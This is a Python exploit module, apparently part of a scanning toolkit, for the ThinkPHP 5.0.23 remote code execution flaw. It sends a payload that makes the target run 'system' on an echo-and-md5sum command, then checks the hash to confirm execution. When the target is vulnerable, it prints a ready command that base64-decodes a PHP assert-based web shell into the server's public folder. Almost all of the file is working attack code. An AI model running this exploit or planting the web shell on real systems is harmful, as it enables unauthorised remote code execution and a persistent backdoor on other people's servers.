import requests
import re
from bs4 import BeautifulSoup
import logging
import json

ca=''
http = ''
https = ''
def dl12(dl):
    global http,https
    http=dl
    https=dl
def tk(ur,s_cookie):
    global http, https
    global ca
    try:
        proxies = {'http': http,
                   'https': https}
        url = ur + 'index.php?s=captcha'
        data = {"_method": "__construct", "filter[]": "system", "method": "get",
                "server[REQUEST_METHOD]": "echo root:|md5sum"}
        logging.captureWarnings(True)
        r = requests.post(url,cookies=s_cookie,data=data, proxies=proxies, verify=False)
        r.encoding = 'utf-8'
        ca = BeautifulSoup(r.text, 'html.parser')
        if '30bb1aaee75fb0e809cd4a3f4c47514f  -' in ca.text:
            ca ="""
                 [+]漏洞存在\n 
                 上传allocation.php: echo -n YWFhPD9waHAgQGFzc2VydCgkX1BPU1RbJzEyMzQnXSk7Pz5iYmI= | base64 -d > /var/www/public/allocation.php\n
                """
        else:
            ca='[-]漏洞不存在'
    except Exception as aaa:
        ca='[-]页面访问失败\n'+str(aaa)
def jg5():
    global ca
    return '--------------------------------------------------\n[ ThinkPHP5 5.0.23 远程代码执行漏洞 ]\n\n'+ str (ca)+'\n'
def u4(aoca,pd,s_cookie):
    global http,https
    url1 = aoca
    if pd=='0':
        http = None
        https = None
        tk(url1,s_cookie)
    elif pd=='1':
        tk(url1,s_cookie)